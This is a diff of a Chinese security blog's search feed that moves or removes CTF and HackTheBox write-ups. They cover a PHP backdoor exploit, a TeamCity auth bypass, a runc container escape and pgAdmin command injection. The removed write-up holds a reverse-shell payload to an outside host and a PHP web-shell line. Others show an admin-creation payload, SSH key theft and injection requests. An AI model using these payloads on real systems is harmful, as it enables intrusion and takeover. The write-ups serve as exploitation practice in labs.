-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153311602.png"></p>
-<h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>打开题目提示在&#x2F;root里面，应该是最后要提权</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123434018.png"></p>
-<p>按照提示和php开发仓库入侵有关，搜出来刚好是对应题目php版本，可以利用<strong>User-Agentt</strong>头来命令执行 <a href="https://forum.butian.net/index.php/share/553">参考文章</a></p>
-<p>我们bp抓包，构造如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123828640.png"></p>
-<p>反弹成功，接下来尝试sh脚本提权发现不行</p>
-<p>提示说和sudo提权有关，刚刚试了<code>sudo -l -S</code>是需要密码的所以肯定是存在提权漏洞</p>
-<p>搜出来<code>CVE-2021-3156</code></p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124217000.png"></p>
-<p>nc连接的靶机上传脚本比较麻烦，所以我们写马利用蚁剑上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/shell.php&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://gitcode.com/Rvn0xsy/CVE-2021-3156-plus/overview">漏洞exp利用链接</a></p>
-<p>上传成功</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124426238.png"></p>
-<p>然后再nc连接，成功提权</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
-<p>得到flag</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
   </entry>
   <entry>
     <title>NSSRound#20 Basic</title>
@@ -2168,6 +2168,107 @@
       </tags>
   </entry>
   <entry>
+    <title>Runner</title>
+    <url>/article/Runner-HackTheBox.html</url>
+    <content><![CDATA[<p>JetBrains TeamCity 身份验证绕过漏洞、runC 逃逸漏洞</p>
+<span id="more"></span>
+
+<h1 id="Runner"><a href="#Runner" class="headerlink" title="Runner"></a>Runner</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.13</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口发现重定向，添加到<code>/etc/hosts</code>后成功访问</p>
+<p>一番搜索没什么东西，扫一下目录和子域名</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518224235291.png"></p>
+<p>发现状态码为401，将该子域名添加到hosts文件，访问是登陆界面</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518224323364.png"></p>
+<p>扫一下目录</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518225531291.png"></p>
+<p>当我们访问<code>/404.html</code>的时候发现是JetBrains</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518225615781.png"></p>
+<p>由于是登陆界面，去网上找到篇文章是关于JetBrains TeamCity身份验证绕过的漏洞 <a href="https://forum.butian.net/share/2801">文章链接</a></p>
+<p>这里就不进行分析了，直接按照文章打exp</p>
+<p>获取用户列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx?jsp=/app/rest/users;.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240518230831965.png"></p>
+<p>可以看到存在四个用户</p>
+<p>我们添加管理员用户，payload如下（注意解析json数据）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test@qq.com&quot;, &quot;roles&quot;: &#123;&quot;role&quot;: [&#123;&quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240518231558874.png"></p>
+<p>我们再查看下用户列表，发现添加test用户成功</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518231657492.png"></p>
+<p>看漏洞是说有两种可以getshell，一种是上传插件另外一种是利用token绕过权限命令执行</p>
+<p>测试一下都没成功，正确解法是管理界面存在备份文件</p>
+<p><img src="/article/Runner-HackTheBox/image-20240519231605539.png"></p>
+<p>下载下来后，在users文件找到用户及密码</p>
+<p><img src="/article/Runner-HackTheBox/image-20240519231756558.png"></p>
+<p>john的密码爆破要很久，成功爆破用户matthew的密码<code>piper123</code></p>
+<p>不过这里</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520201810126.png"></p>
+<p>我们继续去找私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rnw . -e &quot;BEGIN OPENSSH PRIVATE KEY&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到文件路径<code>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></p>
+<p>我们使用cp命令放到我们当前文件夹，尝试ssh登陆发现刚好就是john的私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa john@10.10.11.13</span><br></pre></td></tr></table></figure>
+
+<p>拿到user的flag，由于不知道john的密码，无法用sudo提权</p>
+<p>只能分析一下网络连接的端口情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -nltp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240520202711385.png"></p>
+<p>这里注意到9000端口是开放的，使用工具chisel搭建隧道把目标9000端口映射到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel client 10.10.14.60:6150 R:9000:127.0.0.1:9000  #R表示反向隧道</span><br></pre></td></tr></table></figure>
+
+<p>在本机开启监听6150端口，并执行反向连接，然后靶机主动去监听ip为10.10.14.60的本机并将9000端口映射到本机9000端口</p>
+<p>首先在本地开启http服务，然后传上去chisel</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.60:777/chisel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240520204727134.png"></p>
+<p>然后就是在本机开启监听后，靶机上执行命令即可搭建隧道</p>
+<p>注意两个点</p>
+<ul>
+<li>第一就是本机kali上pip安装的和我们传上去的chisel版本会不一致，所以传哪个本机上就用哪个</li>
+<li>第二就是记得赋予可执行权限给chisel</li>
+</ul>
+<p><img src="/article/Runner-HackTheBox/image-20240520210045416.png"></p>
+<p>搭建隧道成功后访问本地9000端口，发现是登陆界面</p>
+<p>我们拿刚刚爆破得到的用户密码成功登陆</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520211026329.png"></p>
+<p>是个管理容器的平台，点击容器查看docker版本为25.03，对应runc版本1.0.0-rc93</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520212110157.png"></p>
+<p>此版本的runc存在容器逃逸漏洞 <a href="https://nitroc.org/posts/cve-2024-21626-illustrated/">参考文章</a></p>
+<p>根据参考文章，攻击者可通过以下两种方式利用该漏洞：</p>
+<ul>
+<li>启动一个容器时将容器的工作目录设置为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code>为打开 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录时返回的文件描述符，一般情况下为 7 或 8）。</li>
+<li>在容器中为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code> 为打开<code>/sys/fs/cgroup</code>目录时返回的文件描述符，一般情况下为 7 或 8） 创建一个符号链接。当外部在该容器中执行命令时，容器中可通过<code>/proc/&lt;PID&gt;/cwd</code>符号链接访问宿主机文件系统中的<code>/sys/fs/cgroup</code>目录，并利用形如<code>/proc/&lt;PID&gt;/cwd/../../../</code>的路径访问宿主机文件系统。</li>
+</ul>
+<p>我们先添加新的volume</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221407006.png"></p>
+<p>然后创建新容器</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221850313.png"></p>
+<p>修改工作目录</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221608215.png"></p>
+<p>注意要设置volume</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221701687.png"></p>
+<p>创建好后，进入控制台填上root去连接</p>
+<p>成功得到root的flag</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520220836933.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SolarLab</title>
     <url>/article/SolarLab-HackTheBox.html</url>
     <content><![CDATA[<p>SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞</p>
@@ -2287,107 +2388,6 @@
       <tags>
         <tag>HackTheBox</tag>
         <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Runner</title>
-    <url>/article/Runner-HackTheBox.html</url>
-    <content><![CDATA[<p>JetBrains TeamCity 身份验证绕过漏洞、runC 逃逸漏洞</p>
-<span id="more"></span>
-
-<h1 id="Runner"><a href="#Runner" class="headerlink" title="Runner"></a>Runner</h1><p><strong>信息搜集</strong></p>
-<p>nmap扫描端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.13</span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure>
-
-<p>访问80端口发现重定向，添加到<code>/etc/hosts</code>后成功访问</p>
-<p>一番搜索没什么东西，扫一下目录和子域名</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518224235291.png"></p>
-<p>发现状态码为401，将该子域名添加到hosts文件，访问是登陆界面</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518224323364.png"></p>
-<p>扫一下目录</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518225531291.png"></p>
-<p>当我们访问<code>/404.html</code>的时候发现是JetBrains</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518225615781.png"></p>
-<p>由于是登陆界面，去网上找到篇文章是关于JetBrains TeamCity身份验证绕过的漏洞 <a href="https://forum.butian.net/share/2801">文章链接</a></p>
-<p>这里就不进行分析了，直接按照文章打exp</p>
-<p>获取用户列表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx?jsp=/app/rest/users;.jsp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Runner-HackTheBox/image-20240518230831965.png"></p>
-<p>可以看到存在四个用户</p>
-<p>我们添加管理员用户，payload如下（注意解析json数据）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test@qq.com&quot;, &quot;roles&quot;: &#123;&quot;role&quot;: [&#123;&quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Runner-HackTheBox/image-20240518231558874.png"></p>
-<p>我们再查看下用户列表，发现添加test用户成功</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518231657492.png"></p>
-<p>看漏洞是说有两种可以getshell，一种是上传插件另外一种是利用token绕过权限命令执行</p>
-<p>测试一下都没成功，正确解法是管理界面存在备份文件</p>
-<p><img src="/article/Runner-HackTheBox/image-20240519231605539.png"></p>
-<p>下载下来后，在users文件找到用户及密码</p>
-<p><img src="/article/Runner-HackTheBox/image-20240519231756558.png"></p>
-<p>john的密码爆破要很久，成功爆破用户matthew的密码<code>piper123</code></p>
-<p>不过这里</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520201810126.png"></p>
-<p>我们继续去找私钥文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rnw . -e &quot;BEGIN OPENSSH PRIVATE KEY&quot;</span><br></pre></td></tr></table></figure>
-
-<p>得到文件路径<code>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></p>
-<p>我们使用cp命令放到我们当前文件夹，尝试ssh登陆发现刚好就是john的私钥文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa john@10.10.11.13</span><br></pre></td></tr></table></figure>
-
-<p>拿到user的flag，由于不知道john的密码，无法用sudo提权</p>
-<p>只能分析一下网络连接的端口情况</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -nltp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Runner-HackTheBox/image-20240520202711385.png"></p>
-<p>这里注意到9000端口是开放的，使用工具chisel搭建隧道把目标9000端口映射到本地</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel client 10.10.14.60:6150 R:9000:127.0.0.1:9000  #R表示反向隧道</span><br></pre></td></tr></table></figure>
-
-<p>在本机开启监听6150端口，并执行反向连接，然后靶机主动去监听ip为10.10.14.60的本机并将9000端口映射到本机9000端口</p>
-<p>首先在本地开启http服务，然后传上去chisel</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.60:777/chisel</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Runner-HackTheBox/image-20240520204727134.png"></p>
-<p>然后就是在本机开启监听后，靶机上执行命令即可搭建隧道</p>
-<p>注意两个点</p>
-<ul>
-<li>第一就是本机kali上pip安装的和我们传上去的chisel版本会不一致，所以传哪个本机上就用哪个</li>
-<li>第二就是记得赋予可执行权限给chisel</li>
-</ul>
-<p><img src="/article/Runner-HackTheBox/image-20240520210045416.png"></p>
-<p>搭建隧道成功后访问本地9000端口，发现是登陆界面</p>
-<p>我们拿刚刚爆破得到的用户密码成功登陆</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520211026329.png"></p>
-<p>是个管理容器的平台，点击容器查看docker版本为25.03，对应runc版本1.0.0-rc93</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520212110157.png"></p>
-<p>此版本的runc存在容器逃逸漏洞 <a href="https://nitroc.org/posts/cve-2024-21626-illustrated/">参考文章</a></p>
-<p>根据参考文章，攻击者可通过以下两种方式利用该漏洞：</p>
-<ul>
-<li>启动一个容器时将容器的工作目录设置为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code>为打开 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录时返回的文件描述符，一般情况下为 7 或 8）。</li>
-<li>在容器中为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code> 为打开<code>/sys/fs/cgroup</code>目录时返回的文件描述符，一般情况下为 7 或 8） 创建一个符号链接。当外部在该容器中执行命令时，容器中可通过<code>/proc/&lt;PID&gt;/cwd</code>符号链接访问宿主机文件系统中的<code>/sys/fs/cgroup</code>目录，并利用形如<code>/proc/&lt;PID&gt;/cwd/../../../</code>的路径访问宿主机文件系统。</li>
-</ul>
-<p>我们先添加新的volume</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221407006.png"></p>
-<p>然后创建新容器</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221850313.png"></p>
-<p>修改工作目录</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221608215.png"></p>
-<p>注意要设置volume</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221701687.png"></p>
-<p>创建好后，进入控制台填上root去连接</p>
-<p>成功得到root的flag</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520220836933.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -2981,63 +2981,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pgAdmin命令执行漏洞</title>
-    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
-<span id="more"></span>
-
-<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
-</blockquote>
-<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
-<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
-<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
-<p>在本地搭建环境，访问5050端口是登录界面</p>
-<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
-<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
-
-<p>成功命令执行，返回包如下</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
-<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
-<ul>
-<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
-<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
-</ul>
-<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
-<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
-<ul>
-<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
-<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
-</ul>
-<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
-<p>Windows下返回结果为True</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
-<p>而Linux下返回结果为False</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
-<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
-<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
-<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
-<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
-<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
-<p>成功命令执行</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-  </entry>
-  <entry>
     <title>vscode+xdebug调试php代码</title>
     <url>/article/vscode-xdebug%E8%B0%83%E8%AF%95php%E4%BB%A3%E7%A0%81.html</url>
     <content><![CDATA[<p>记录如何利用vscode+xdebug调试php代码</p>
@@ -3103,6 +3046,63 @@
       <tags>
         <tag>vscode</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>pgAdmin命令执行漏洞</title>
+    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
+<span id="more"></span>
+
+<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+</blockquote>
+<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
+<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
+<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
+<p>在本地搭建环境，访问5050端口是登录界面</p>
+<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
+<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行，返回包如下</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
+<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
+<ul>
+<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
+<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
+</ul>
